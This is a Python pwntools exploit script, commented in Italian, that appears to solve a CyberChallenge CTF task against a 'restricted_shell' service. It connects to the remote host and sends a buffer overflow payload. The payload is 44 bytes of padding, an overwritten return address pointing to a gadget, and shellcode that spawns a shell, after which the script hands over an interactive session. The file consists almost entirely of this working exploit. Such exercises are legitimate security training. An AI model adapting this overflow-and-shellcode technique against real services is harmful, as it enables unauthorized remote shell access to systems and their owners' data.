#!/usr/bin/env python3

# Importa la libreria di pwntools
from pwn import *


def main():
    '''
    remote(hostname, port) apre una socket e ritorna un object
    che può essere usato per inviare e ricevere dati sulla socket  
    '''
    HOST = "shell.challs.cyberchallenge.it"
    PORT = 9123
    r = remote(HOST, PORT)
    exe = ELF("./restricted_shell")
    context.binary = exe
    #r = process(exe.path)


    # .send() può essere invocato sull'oggetto ritornato da remote() per inviare dati
    #r.send(b"Ciao!")

    # .sendline() è identico a .send(), però appende un newline dopo i dati
    #r.sendline(b"Ciao!")

    # .sendafter() e .sendlineafter() inviano la stringa "Ciao!"
    #r.sendafter(b"... Invia un qualsiasi carattere per iniziare ...", b"k")


    # .recvuntil() legge dalla socket finchè non viene incontrata la stringa "something"

    return_address = p32(0x08048593, endianness='little') #gadget address
    string = "a" * 44 #40 buff bytes + 4 frame pointer bytes
    string_bytes = str.encode(string)
    payload = string_bytes + return_address + asm(shellcraft.sh())

    print(type(payload))
    print(payload)
    r.sendlineafter(b"restricted-shell c:\ > ", payload)

    data = r.recv(1024)
    print(data)


    # permette di interagire con la connessione direttamente dalla shell
    r.interactive()

    # chiude la socket
    r.close()


if __name__ == "__main__":
    main()
